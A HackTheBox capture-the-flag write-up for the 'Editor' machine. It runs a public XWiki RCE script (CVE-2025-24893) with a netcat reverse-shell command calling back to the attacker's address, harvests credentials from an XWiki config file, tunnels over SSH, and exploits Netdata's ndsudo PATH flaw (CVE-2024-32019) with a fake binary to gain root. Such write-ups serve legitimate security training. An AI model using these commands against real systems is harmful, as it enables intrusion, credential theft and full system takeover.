# Editor (HackTheBox)


## Rustscan 
- ```rustscan -r 1-65535 -a 10.10.11.80 -- -sV -o rustscan.out```

## Output 
```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
8080/tcp open  http    syn-ack Jetty 10.0.20
```

## Web Enumeration

- Exploit db has a RCE I can do
- No metasploit
- ```https://github.com/gunzf0x/CVE-2025-24893/tree/main?source=post_page-----2128149b1929---------------------------------------```
- First approach
- After trial and error I was able to get this to work ```python3 CVE-2025-24893.py -t 'http://10.10.11.80:8080' -c 'busybox nc 10.10.14.6 4444 -e /bin/bash'```
- and then 
```
Listening on 0.0.0.0 4444
Connection received on 10.10.11.80 35144
id
uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)
```
- then
```
export TERM=xterm

which python3

python3 -c 'import pty; pty.spawn("/bin/bash")'

stty raw -echo; fg

export SHELL=/bin/bash
stty rows 38 columns 116 
```

## Post exploit
- I used ```https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS```
- and got creds
- found the creds in ```/etc/xwiki/hibernate.cfg.xml```
- I did a ssh or a su into ```oliver``` and was able to find the userflag
- ```833ba87141bd759470d02ec60e2eb9c1```


## Priv ex
- oliver has like no perms to do anything
- Since I now had SSH access, I moved on to exploring internal services through port forwarding
```
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8125          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:44611         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:19999         0.0.0.0:*               LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 127.0.0.1:8079          :::*                    LISTEN     
tcp6       0      0 :::8080                 :::*                    LISTEN     
udp        0      0 127.0.0.1:8125          0.0.0.0:*                          
udp        0      0 127.0.0.53:53           0.0.0.0:*        
```

- Now time to make a ssh tunnel to see whats up ```ssh -L 19999:127.0.0.1:19999 oliver@10.10.11.80```
- checked wappalyzer since i hadent before and found that *CVE-2024–32019* would work
- ```https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93?source=post_page-----2128149b1929---------------------------------------```
- This vulnerability affects the ndsudo binary that ships with Netdata. It allows a Local Privilege Escalation (LPE) by exploiting an insecure PATH environment variable.

- We can create a fake nvme binary, which gets executed instead of the real one when ndsudo tries to call nvme-list.
- ```https://github.com/AliElKhatteb/CVE-2024-32019-POC?source=post_page-----2128149b1929---------------------------------------```
- check the c program for other notes
- and compiled with ```x86_64-linux-gnu-gcc -o nvme exploit.c -static```
- also run on the home machine lol
- scp nvme oliver@10.10.11.80:/tmp/
- then move nvme to his home dir
- allow the port 
- then run nc 
- then the command and root!

## Finally
- check /root/
- ```aecef68e7fe19915996e9ff2650aa1b3```